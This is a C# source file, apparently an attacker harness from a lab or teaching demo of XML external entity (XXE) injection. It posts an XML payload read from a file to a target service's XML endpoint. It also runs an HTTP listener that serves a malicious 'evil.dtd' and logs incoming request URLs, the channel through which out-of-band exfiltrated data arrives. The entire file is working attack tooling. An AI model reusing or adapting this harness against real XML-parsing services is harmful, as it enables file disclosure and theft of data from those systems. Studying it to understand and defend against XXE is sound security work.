using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Threading;
using A4.Attacker.Entities;

namespace A4.Attacker
{
    class Program
    {
        static void Main(string[] args)
        {
            new Thread(StartServer).Start();
            SendXML();
        }

        private static void StartServer()
        {
            var prefixes = new List<string>() { "http://localhost:50666/" };
            var listener = new HttpListener {  };
            foreach (string s in prefixes) listener.Prefixes.Add(s);
            listener.Start();

            Console.WriteLine("Listening...");

            while (true)
            {
                var context = listener.GetContext();
                var request = context.Request;
                string documentContents;

                using (Stream receiveStream = request.InputStream)
                {
                    using (StreamReader readStream = new StreamReader(receiveStream, Encoding.UTF8))
                    {
                        documentContents = readStream.ReadToEnd();
                    }
                }

                Console.WriteLine(request.RawUrl);

                if (request.Url.AbsoluteUri.Contains("evil.dtd")) SendDTD(context);
                else
                {
                    var response = context.Response;
                    string responseString = "<!ENTITY hacked 'hacked'>";
                    byte[] buffer = Encoding.UTF8.GetBytes(responseString);
                    response.ContentLength64 = buffer.Length;
                    Stream output = response.OutputStream;
                    output.Write(buffer, 0, buffer.Length);
                    output.Close();
                }
            }
        }

        private static async void SendXML()
        {
            var client = new HttpClient { BaseAddress = new Uri("http://localhost:50622/") };

            var order = new Order
            {
                Id = 1,
                Content = File.ReadAllText("files/request.xml")
            };

            var content = new StringContent(JsonSerializer.Serialize(order), Encoding.UTF8, "application/json");
            var response = await client.PostAsync("api/xml", content);
            response.EnsureSuccessStatusCode();
        }

        private static void SendDTD(HttpListenerContext context)
        {
            string path = "files/evil.dtd";
            var response = context.Response;

            using (FileStream fs = File.OpenRead(path))
            {
                string filename = Path.GetFileName(path);
                response.ContentLength64 = fs.Length;
                response.SendChunked = false;
                response.ContentType = System.Net.Mime.MediaTypeNames.Application.Octet;
                response.AddHeader("Content-disposition", "attachment; filename=" + filename);

                byte[] buffer = new byte[64 * 1024];
                int read;

                using (BinaryWriter bw = new BinaryWriter(response.OutputStream))
                {
                    while ((read = fs.Read(buffer, 0, buffer.Length)) > 0)
                    {
                        bw.Write(buffer, 0, read);
                        bw.Flush();
                    }

                    bw.Close();
                }

                response.StatusCode = (int)HttpStatusCode.OK;
                response.StatusDescription = "OK";
                response.OutputStream.Close();
            }
        }
    }
}